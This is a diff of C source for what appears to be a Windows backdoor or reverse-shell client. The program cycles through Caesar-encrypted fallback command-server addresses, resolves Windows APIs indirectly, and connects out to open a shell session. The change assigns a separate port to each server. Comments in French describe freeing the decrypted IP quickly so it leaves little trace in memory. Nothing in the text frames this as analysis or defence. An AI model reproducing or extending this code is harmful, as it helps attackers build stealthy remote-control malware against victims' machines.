@@ -105,8 +105,6 @@ void SendShellEndedSignal(SOCKET sock) {
 	}
 }
 
-#define FALLBACK_SERVERS 4
-
 int serv = -1;
 int main() {
 	InitApis();
@@ -124,7 +122,6 @@ int main() {
 	struct sockaddr_in server;
 	char* server_reply = (char*)Api.malloc(BUFFER_SIZE);
 	server.sin_family = AF_INET;
-	server.sin_port = Api.htons(1337);
 
 	WORD wVersionRequested = MAKEWORD(2, 2);
 	WSADATA wsaData;
@@ -142,7 +139,19 @@ retry:
 	if (serv > FALLBACK_SERVERS - 1) {
 		serv = 0;
 	}
-	server.sin_addr.s_addr = Api.inet_addr(CAESAR_DECRYPT(fallback_servers[serv]));
+
+	//on fait une copie de l'ip chiffrée, puis on la free
+	//ça évite qu'elle reste dans la mémoire trop longtemps
+	//ça évite aussi qu'on utilise CAESAR_DECRYPT sur une ip déjà décryptée
+	size_t len = strlen(fallback_servers[serv]);
+	char* Tmp = Api.malloc(len + 1);
+	Api.strcpy(Tmp, fallback_servers[serv]);
+
+	server.sin_addr.s_addr = Api.inet_addr(CAESAR_DECRYPT(Tmp));
+
+	Api.free(Tmp);
+
+	server.sin_port = Api.htons(fallback_servers_ip[serv]);
 
 	//Create socket
 	sock = Api.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
